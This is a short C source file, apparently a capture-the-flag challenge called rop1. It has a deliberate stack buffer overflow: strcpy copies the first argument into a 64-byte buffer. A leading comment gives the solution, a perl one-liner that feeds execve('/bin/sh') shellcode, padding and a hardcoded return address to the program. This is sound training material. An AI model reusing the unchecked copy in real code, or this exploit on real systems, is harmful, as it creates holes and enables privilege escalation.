/*
** Solution
** pico4180@shell:/home/rop1$ ./rop1  $(perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" . "A"x27 . "AAAA" . "\x70\xd6\xff\xff"')
*/



#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
